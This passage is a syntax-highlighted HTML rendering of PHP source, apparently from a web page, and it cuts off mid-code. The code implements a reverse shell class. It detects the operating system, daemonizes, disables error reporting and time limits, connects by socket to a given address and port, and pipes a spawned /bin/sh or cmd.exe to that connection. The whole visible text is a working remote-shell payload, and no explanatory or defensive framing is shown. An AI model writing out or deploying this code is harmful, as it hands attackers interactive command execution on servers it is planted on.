</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=nv>$sdump</span>  <span class=o>=</span> <span class=k>true</span><span class=p>;</span>  <span class=c1>// script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$addr</span><span class=p>,</span> <span class=nv>$port</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addr</span> <span class=o>=</span> <span class=nv>$addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>port</span> <span class=o>=</span> <span class=nv>$port</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>detect</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$detected</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$os</span> <span class=o>=</span> <span class=k>PHP_OS</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;LINUX&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;DARWIN&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span>    <span class=o>=</span> <span class=s1>&#39;LINUX&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>shell</span> <span class=o>=</span> <span class=s1>&#39;/bin/sh&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;WINDOWS&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;WINNT&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span> <span class=o>||</span> <span class=nx>stripos</span><span class=p>(</span><span class=nv>$os</span><span class=p>,</span> <span class=s1>&#39;WIN32&#39;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span>    <span class=o>=</span> <span class=s1>&#39;WINDOWS&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>shell</span> <span class=o>=</span> <span class=s1>&#39;cmd.exe&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$detected</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;SYS_ERROR: Underlying operating system is not supported, script will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$detected</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>daemonize</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$exit</span> <span class=o>=</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;pcntl_fork&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: pcntl_fork() does not exists, moving on...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=nv>$pid</span> <span class=o>=</span> <span class=o>@</span><span class=nx>pcntl_fork</span><span class=p>())</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Cannot fork off the parent process, moving on...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$pid</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$exit</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Child process forked off successfully, parent process will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// once daemonized, you will actually no longer see the script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>posix_setsid</span><span class=p>()</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;DAEMONIZE: Completed successfully!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>settings</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nx>set_time_limit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// do not impose the script execution time limit
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=o>@</span><span class=nx>umask</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// set the file/directory permissions - 666 for files and 777 for directories
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sdump</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>read</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$name</span><span class=p>,</span> <span class=nv>$buffer</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=nv>$data</span> <span class=o>=</span> <span class=o>@</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$buffer</span><span class=p>))</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// suppress an error when reading from a closed blocking stream
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>                            <span class=c1>// set the global error flag
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>echo</span> <span class=s2>&#34;STRM_ERROR: Cannot read from </span><span class=si>{</span><span class=nv>$name</span><span class=si>}</span><span class=s2>, script will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>write</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$name</span><span class=p>,</span> <span class=nv>$data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>((</span><span class=nv>$bytes</span> <span class=o>=</span> <span class=o>@</span><span class=nx>fwrite</span><span class=p>(</span><span class=nv>$stream</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// suppress an error when writing to a closed blocking stream
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>error</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>                            <span class=c1>// set the global error flag
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>echo</span> <span class=s2>&#34;STRM_ERROR: Cannot write to </span><span class=si>{</span><span class=nv>$name</span><span class=si>}</span><span class=s2>, script will now exit...</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// read/write method for non-blocking streams
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=k>function</span> <span class=nf>rw</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$output</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>((</span><span class=nv>$data</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;WINDOWS&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$oname</span> <span class=o>===</span> <span class=s1>&#39;STDIN&#39;</span><span class=p>)</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>+=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// calculate the command length
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span> <span class=c1>// script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we must read the exact byte length from a stream and not a single byte more
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>private</span> <span class=k>function</span> <span class=nf>brw</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$output</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$size</span> <span class=o>=</span> <span class=nx>fstat</span><span class=p>(</span><span class=nv>$input</span><span class=p>)[</span><span class=s1>&#39;size&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;WINDOWS&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$iname</span> <span class=o>===</span> <span class=s1>&#39;STDOUT&#39;</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// for some reason Windows OS pipes STDIN into STDOUT
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// we do not like that
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=c1>// so we need to discard the data from the stream
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>while</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$bytes</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>&gt;=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>?</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>:</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$bytes</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clen</span> <span class=o>-=</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nv>$size</span> <span class=o>-=</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=nv>$size</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$bytes</span> <span class=o>=</span> <span class=nv>$size</span> <span class=o>&gt;=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>?</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>buffer</span> <span class=o>:</span> <span class=nv>$size</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$data</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=nv>$input</span><span class=p>,</span> <span class=nv>$iname</span><span class=p>,</span> <span class=nv>$bytes</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nv>$output</span><span class=p>,</span> <span class=nv>$oname</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$size</span> <span class=o>-=</span> <span class=nv>$bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dump</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span> <span class=c1>// script&#39;s dump
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>run</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>detect</span><span class=p>()</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>daemonize</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>settings</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>// ----- SOCKET BEGIN -----
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$socket</span> <span class=o>=</span> <span class=o>@</span><span class=nx>fsockopen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>addr</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>port</span><span class=p>,</span> <span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=mi>30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$socket</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;SOC_ERROR: </span><span class=si>{</span><span class=nv>$errno</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=nv>$errstr</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span> <span class=c1>// set the socket stream to non-blocking mode | returns &#39;true&#39; on Windows OS
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>                <span class=c1>// ----- SHELL BEGIN -----
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$process</span> <span class=o>=</span> <span class=o>@</span><span class=nx>proc_open</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>shell</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>descriptorspec</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>,</span> <span class=k>null</span><span class=p>,</span> <span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$process</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>echo</span> <span class=s2>&#34;PROC_ERROR: Cannot start the shell</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$pipes</span> <span class=k>as</span> <span class=nv>$pipe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nx>stream_set_blocking</span><span class=p>(</span><span class=nv>$pipe</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span> <span class=c1>// set the shell streams to non-blocking mode | returns &#39;false&#39; on Windows OS
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=c1>// ----- WORK BEGIN -----
</span></span></span><span class=line><span class=cl><span class=c1></span>                    <span class=nv>$status</span> <span class=o>=</span> <span class=nx>proc_get_status</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=o>@</span><span class=nx>fwrite</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=s2>&#34;SOCKET: Shell has connected! PID: </span><span class=si>{</span><span class=nv>$status</span><span class=p>[</span><span class=s1>&#39;pid&#39;</span><span class=p>]</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$status</span> <span class=o>=</span> <span class=nx>proc_get_status</span><span class=p>(</span><span class=nv>$process</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$socket</span><span class=p>))</span> <span class=p>{</span> <span class=c1>// check for end-of-file on SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=k>echo</span> <span class=s2>&#34;SOC_ERROR: Shell connection has been terminated</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>||</span> <span class=o>!</span><span class=nv>$status</span><span class=p>[</span><span class=s1>&#39;running&#39;</span><span class=p>])</span> <span class=p>{</span>                 <span class=c1>// check for end-of-file on STDOUT or if process is still running
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=k>echo</span> <span class=s2>&#34;PROC_ERROR: Shell process has been terminated</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>   <span class=k>break</span><span class=p>;</span> <span class=c1>// feof() does not work with blocking streams
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=p>}</span>                                                                    <span class=c1>// use proc_get_status() instead
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=nv>$streams</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;read&#39;</span>   <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>]),</span> <span class=c1>// SOCKET | STDOUT | STDERR
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=s1>&#39;write&#39;</span>  <span class=o>=&gt;</span> <span class=k>null</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                            <span class=s1>&#39;except&#39;</span> <span class=o>=&gt;</span> <span class=k>null</span>
</span></span><span class=line><span class=cl>                        <span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=nv>$num_changed_streams</span> <span class=o>=</span> <span class=o>@</span><span class=nx>stream_select</span><span class=p>(</span><span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;except&#39;</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span> <span class=c1>// wait for stream changes | will not wait on Windows OS
</span></span></span><span class=line><span class=cl><span class=c1></span>                        <span class=k>if</span> <span class=p>(</span><span class=nv>$num_changed_streams</span> <span class=o>===</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>echo</span> <span class=s2>&#34;STRM_ERROR: stream_select() failed</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$num_changed_streams</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                            <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;LINUX&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$socket</span>  <span class=p>,</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span><span class=p>(</span><span class=nv>$socket</span>  <span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>,</span> <span class=s1>&#39;STDIN&#39;</span> <span class=p>);</span> <span class=p>}</span> <span class=c1>// read from SOCKET and write to STDIN
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDERR&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDERR and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span><span class=p>(</span><span class=nv>$pipes</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$socket</span>  <span class=p>,</span> <span class=s1>&#39;STDOUT&#39;</span><span class=p>,</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>);</span> <span class=p>}</span> <span class=c1>// read from STDOUT and write to SOCKET
</span></span></span><span class=line><span class=cl><span class=c1></span>                            <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>os</span> <span class=o>===</span> <span class=s1>&#39;WINDOWS&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                                <span class=c1>// order is important
</span></span></span><span class=line><span class=cl><span class=c1></span>                                <span class=k>if</span> <span class=p>(</span><span class=nx>in_array</span><span class=p>(</span><span class=nv>$socket</span><span class=p>,</span> <span class=nv>$streams</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span><span class=cm>/*------*/</span><span class=p>)</span> <span class=p>{</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>rw</span> <span class=p>(</span><span class=nv>$socket</span>  <span class=p>,</span> <span class=nv>$pipes</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s1>&#39;SOCKET&#39;</span><span class=p>,</span> <span class=s1>&#39;STDIN&#39;</span> <span class=p>);</span> <span class=p>}</span> <span class=c1>// read from SOCKET and write to STDIN
